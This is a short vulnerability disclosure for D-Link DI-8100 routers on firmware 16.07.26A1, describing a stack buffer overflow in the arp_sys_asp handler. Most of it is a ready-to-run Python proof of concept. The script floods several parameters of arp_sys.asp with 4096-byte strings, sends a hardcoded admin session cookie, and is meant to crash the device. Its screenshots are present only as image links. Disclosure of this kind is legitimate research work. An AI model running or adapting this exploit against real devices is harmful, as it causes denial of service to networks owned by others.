
A critical stack-based buffer overflow vulnerability exists in the arp_sys_asp function of D-Link DI-8100 routers running firmware version 16.07.26A1. This vulnerability could allow remote attackers to cause a Denial of Service (DoS) condition by sending specially crafted HTTP requests to vulnerable devices.

![](./picture/1.png)

![](./picture/2.png)

POC:
```python
import requests
from pwn import *
import time

def exploit(target_ip):
    auth_cookie = "wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"
    
    timestamp = int(time.time())
    attack_url = f"http://{target_ip}/arp_sys.asp?_{timestamp}"
    pay =  b"A"*0x1000
    
    payload = {
        "notify": pay,  
        "notify_tm":pay,
        "check":pay,
        "check_tm":pay,
        "zn_jb":pay,
    }
    
    headers = {
        "Host": target_ip,
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cookie": auth_cookie,
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }
    
    try:
        response = requests.get(
            attack_url,
            params=payload,  
            headers=headers,
            timeout=5,
            verify=False
        )
        
        print(f"Response status code: {response.status_code}")
        print(f"Response length: {len(response.text)} bytes")
        
        print("\nResponse preview:")
        print(response.text[:500])
        
    except Exception as e:
        print(f"[!] The request failed: {str(e)}")

if __name__ == "__main__":
    TARGET_IP = "192.168.0.1"  
    exploit(TARGET_IP)
```

![](./picture/3.png)

![](./picture/4.png)

![](./picture/5.png)

![](./picture/6.png)






































